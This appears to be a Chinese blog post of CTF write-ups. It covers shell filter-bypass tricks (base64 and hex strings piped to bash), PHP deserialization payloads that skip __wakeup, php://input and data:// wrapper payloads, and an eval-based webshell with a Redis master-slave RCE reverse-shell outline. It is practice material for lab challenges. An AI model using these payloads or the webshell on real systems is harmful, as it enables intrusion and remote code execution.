+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cat fl*  用*匹配任意 </span><br><span class="line">cat fla* 用*匹配任意</span><br><span class="line">ca\t fla\g.php        反斜线绕过</span><br><span class="line">cat fl&#x27;&#x27;ag.php        两个单引号绕过</span><br><span class="line">echo &quot;Y2F0IGZsYWcucGhw&quot; | base64 -d | bash      </span><br><span class="line">//base64编码绕过(引号可以去掉)  |(管道符) 会把前一个命令的输出作为后一个命令的参数</span><br><span class="line"></span><br><span class="line">echo &quot;63617420666c61672e706870&quot; | xxd -r -p | bash       </span><br><span class="line">//hex编码绕过(引号可以去掉)</span><br><span class="line"></span><br><span class="line">echo &quot;63617420666c61672e706870&quot; | xxd -r -p | sh     </span><br><span class="line">//sh的效果和bash一样</span><br><span class="line"></span><br><span class="line">cat fl[a]g.php       用[]匹配</span><br><span class="line"></span><br><span class="line">a=fl;b=ag;cat $a$b          变量替换</span><br><span class="line">cp fla&#123;g.php,G&#125;    把flag.php复制为flaG</span><br><span class="line">ca$&#123;21&#125;t a.txt     利用空变量  使用$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;=10)(小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的 </span><br></pre></td></tr></table></figure>
+<p>通配符</p>
+<p><img src="/2022/03/31/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20200829180931498.png" alt></p>
+<h4 id="PHP">PHP</h4>
+<p>考点：</p>
+<ul>
+<li>目录扫描工具</li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46635165/article/details/108989910">__wakeup()函数漏洞利用</a></li>
+<li>序列化与反序列化</li>
+<li>私有属性(前缀加上%00)</li>
+</ul>
+<p>根据题目提示，使用dirsearch扫描目录（御剑无法扫描.zip）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u 607f3f93-b85f-49fa-9182-d27b81a4ecf1.node4.buuoj.cn:81/ -e * -w PHP.txt</span><br></pre></td></tr></table></figure>
+<p>其中，<code>PHP.txt</code>为字典，之后找到一个<code>www.zip</code>的压缩包，下载下来。</p>
+<p><img src="/2022/03/31/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" alt></p>
+<p>flag.php是没有的，有用的是index.php和class.php，接下来就是代码审计的环节。</p>
+<p>index.php的主要代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include &#x27;class.php&#x27;;</span><br><span class="line">    $select = $_GET[&#x27;select&#x27;];</span><br><span class="line">    $res=unserialize(@$select);</span><br><span class="line">    ?&gt;</span><br><span class="line">    #将class.php包含在其中，以GET的形式传入select，并进行反序列化。</span><br></pre></td></tr></table></figure>
+<p>class.php的主要代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"># 定义一个 名为 Name 类</span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;	#私有属性 username</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;	#私有属性 password</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;	# 对 username password 赋值</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	#__wakeup() 函数，unserialize()反序列化函数前调用；</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username = &#x27;guest&#x27;;  #将 username 赋值 guest;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password != 100) &#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        # 两个判断：</span><br><span class="line">        #第一个if，password！=100，直接退出</span><br><span class="line">        #第二个if，password=100，username做全等运算，不等，退出；全等 输出 flag；</span><br><span class="line">        #也就是说，输出flag,需要满足 username=admin  password=100</span><br><span class="line">        if ($this-&gt;username === &#x27;admin&#x27;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;</span><br><span class="line">            die(); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>代码分析已注释在代码段中，可以看见 index.php中 的 unserialize（）和wakeup() 函数，以及 get方式传参select ，参数可控，可以利用 __wakeup()函数漏洞来解题。</p>
+<p>构造反序列化：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line"> </span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Name(&#x27;admin&#x27;, 100);</span><br><span class="line">var_dump(serialize($a));</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string(77) &quot;O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;&quot;</span><br><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
+<p>由于在反序列化前会先执行__wakeup()，介绍可参考上文考点的链接。<code>&quot;Name&quot;:2</code>表示Name有两个属性，将2修改为大于2的数值后，<strong>由于wakeup()的特性，当表示对象属性个数的值大于真实属性个数的值时，wakeup()函数将不会被执行</strong>，这样就可以绕过将username赋值为guest，从而使username === admin。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
+<p>至此，需要注意： username 和 password 两个属性是私有属性（private）,因此这两个属性在序列化后，输出的其实是 \0类名\0属性名 <strong>（\0 是 ascii 码值，空字符）</strong>,但是在页面输出时无显示，复制的时候也会被删除，因此<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&amp;spm=1001.2101.3001.7020">反序列化</a>时需要手动添加 \0;</p>
+<p>最终payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="ZJCTF-2019-NiZhuanSiWei">[ZJCTF 2019]NiZhuanSiWei</h4>
+<p>考点</p>
+<ul>
+<li>php伪协议</li>
+<li>反序列化</li>
+</ul>
+<p>首先上源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>题目的标签已经给我们提示了，考点如上，反序列化接触好几次，比较熟悉，php伪协议则比较陌生，找到一篇关于<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53142368/article/details/116594299">php伪协议</a>的介绍。</p>
+<p>file_get_contents() 函数把整个文件读入一个字符串中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))</span><br></pre></td></tr></table></figure>
+<p>这个的大概意思是只有将 welcome to the zjctf 传入$text中才能进入下一个步骤。这就涉及到伪协议的知识，即用<code>php://input</code>绕过。</p>
+<p><img src="/2022/03/31/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kj-16474456407881.png" alt></p>
+<p><img src="/2022/03/31/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kjj.png" alt></p>
+<p>同时读取file变量包含的<code>useless.php</code>，其内容就如上面这张图片一样。</p>
+<p>构造如下payload：</p>
+<p><img src="/2022/03/31/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%93%8D%E5%BA%94.png" alt></p>
+<p>得到的是一段base64加密的编码，解码后得到的是<code>useless.php</code>的源码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
+<p>接着就是反序列化的过程了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file=&#x27;flag.php&#x27;;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">			return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Flag();</span><br><span class="line">var_dump(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：  O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>最终payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=php://input&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>enctype=“multipart/form-data” 的时候 php://input 是无效的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="天翼杯-2021-esay-eval">[天翼杯 2021]esay_eval</h4>
+<p>考点</p>
+<ul>
+<li>反序列化</li>
+<li>本地Redis主从复制RCE反弹shell</li>
+<li>intval()绕过</li>
+<li>preg_match_all正则表达式</li>
+</ul>
+<p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    public $code = &quot;&quot;;</span><br><span class="line">    function __call($method,$args)&#123;</span><br><span class="line">        eval($this-&gt;code);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;code = &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;a-&gt;a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_REQUEST[&#x27;poc&#x27;]))&#123;</span><br><span class="line">    preg_match_all(&#x27;/&quot;[BA]&quot;:(.*?):/s&#x27;,$_REQUEST[&#x27;poc&#x27;],$ret);</span><br><span class="line">    if (isset($ret[1])) &#123;</span><br><span class="line">        foreach ($ret[1] as $i) &#123;</span><br><span class="line">            if(intval($i)!==1)&#123;</span><br><span class="line">                exit(&quot;you want to bypass wakeup ? no !&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        unserialize($_REQUEST[&#x27;poc&#x27;]);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<h5 id="preg-match-all函数">preg_match_all函数</h5>
+<p><code>preg_match_all</code>执行一个全局正则表达式匹配，我的理解是将第一项看作搜索模式，第二项看作对应搜索的字符串，第三项则是匹配内容，[0]匹配所有，[1]则匹配第一项，这么理解可能有错，可以看这篇<a target="_blank" rel="noopener" href="https://www.feiniaomy.com/post/421.html">php preg_match_all()函数介绍与用法 </a></p>
+<p>大概理解了代码块后，再一次接触到反序列化和_wakeup函数漏洞，编写反序列化代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class A&#123;</span><br><span class="line">	public $code = &#x27;phpinfo();&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class B&#123;</span><br><span class="line">	public $a;</span><br><span class="line">&#125;</span><br><span class="line">$b = new B();</span><br><span class="line">$b-&gt;a = new A();</span><br><span class="line">echo serialize($b);</span><br></pre></td></tr></table></figure>
+<p>$code变量的值是参考wp的，因为后续的<strong>Redis基于主从复制的RCE方式</strong>会涉及到传马。</p>
+<p>php运行得到的结果为：<code>O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</code>，绕过_wakeup，修改’B’的变量为2。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;B&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/03/31/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" alt></p>
+<p>说明<code>intval($i)!==1</code>没处理好，原来是因为这里要求A或B这两个字符后面跟随的数字是1,否则就会退出程序。</p>
+<p><strong>intval()</strong> 函数用于获取变量的整数值，intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">intval(array(&#x27;foo&#x27;, &#x27;bar&#x27;));     // 1</span><br></pre></td></tr></table></figure>
+<p>这么一来我么要使<code>intval($i)==1</code>，就有办法了，配合正则表达式，将$ret[1]的值改为字符串即可，添加<code>s:1:&quot;a&quot;;N;</code>，同时因为这相当于是添加真实属性的个数，所以这时’B’的变量为2就是正确的值，这就不能绕过了，所以修改’B’的值为原来的1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;s:1:&quot;a&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/03/31/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/55.png" alt></p>
+<p>到这里就完成了第一大步，下面就是Redis基于主从复制的RCE方式。将<code>phpinfo();</code>修改为一句话木马<code>eval($_POST[admin])</code>，用蚁剑连接.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?poc=O:1:%22B%22:1:&#123;s:1:%22a%22;O:1:%22A%22:1:&#123;s:4:%22code%22;s:20:%22eval($_POST[admin]);%22;&#125;s:1:%22n%22:N;&#125;</span><br></pre></td></tr></table></figure>
+<p>连接成功后会发现<code>var/www</code>没有上传权限。</p>
+<h5 id="本地Redis主从复制RCE反弹shell">本地Redis主从复制RCE反弹shell</h5>
+<p>漏洞原理<br>
+对于只允许本地连接的Redis服务器，可以通过开启主从模式从远程主机上同步恶意.so文件至本地，接着载入恶意.so文件模块，反弹shell至远程主机。</p>
+<p>先打开能打开的文件看看。</p>
+<p>config.php.swp</p>
+<p><img src="/2022/03/31/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" alt></p>
+<p>这里面的数据应该有用，先记着。</p>
+<p>index.php则是题目的源码，没有用。</p>
+<p>我们上传so恶意文件，然后加载Redis插件。</p>
+<p><img src="/2022/03/31/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" alt></p>
+<p><img src="/2022/03/31/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png" alt></p>
+<p>右键<code>db0</code>，点击执行指令，进入一个窗口，涉及到redis的命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Redis的模块采用的是动态链接库的方式，可以启动的时候加载，也可以在运行时加载（MODULE LOAD）,在Linux系统里面，可以通过dlopen，dlsym等实现动态加载库，在业务系统里面，经常用于将业务代码和框架代码进行分离，以实现插件化开发。在Redis里面也是同样的道理。要实现分离，首先需要的是初始化，以便让框架可以找到对应的方法，这就需要进行注册，Redis通过RedisModule_Init方法进行注册模块，和RedisModule_CreateCommand注册自定义方法。</span><br><span class="line">Redis导出了redismodule.h头文件，通过实现该头文件相关API函数，然后编译为so动态库即可，可以在配置文件中使用loadmodule指明，也可以在运行时使用命令动态加载（MODULE LOAD）。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Redis Exec 命令 - 执行所有事务块内的命令。</span><br></pre></td></tr></table></figure>
+<p>基本命令的类型都差不多。</p>
+<p><img src="/2022/03/31/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/66.png" alt></p>
+</section>
+    <!-- Tags START -->
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2022/02/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+        <span class="nav-arrow">← </span>
+        
+          文件上传漏洞
+        
+      </a>
+    
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+      <div class="qrcode">
+        <canvas id="share-qrcode"></canvas>
+        <p class="notice">扫描二维码，分享此文章</p>
+      </div>
+    
+    <!-- 二维码 END -->
+    
+      <!-- Utterances START -->
+      <div id="utterances"></div>
+      <script src="https://utteranc.es/client.js"
+        repo=""
+        issue-term="pathname"
+        theme="github-light"
+        crossorigin="anonymous"
+        async></script>    
+      <!-- Utterances END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Warmup"><span class="toc-nav-text">Warmup</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CODE-REVIEW"><span class="toc-nav-text">CODE REVIEW</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#serialize%E5%92%8Cunserialize"><span class="toc-nav-text">serialize和unserialize</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#ping-ping-ping"><span class="toc-nav-text">ping ping ping</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%91%BD%E4%BB%A4%E8%81%94%E5%90%88%E6%89%A7%E8%A1%8C"><span class="toc-nav-text">命令联合执行</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-nav-text">命令绕过空格的方法</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C"><span class="toc-nav-text">内联执行</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#cat%E7%BB%95%E8%BF%87"><span class="toc-nav-text">cat绕过</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#PHP"><span class="toc-nav-text">PHP</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="toc-nav-text">[ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%A4%A9%E7%BF%BC%E6%9D%AF-2021-esay-eval"><span class="toc-nav-text">[天翼杯 2021]esay_eval</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#preg-match-all%E5%87%BD%E6%95%B0"><span class="toc-nav-text">preg_match_all函数</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%9C%AC%E5%9C%B0Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE%E5%8F%8D%E5%BC%B9shell"><span class="toc-nav-text">本地Redis主从复制RCE反弹shell</span></a></li></ol></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://example.com/2022/03/31/序列化与反序列化/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', '/css/images/error_icon.png')
+      $(this).css({
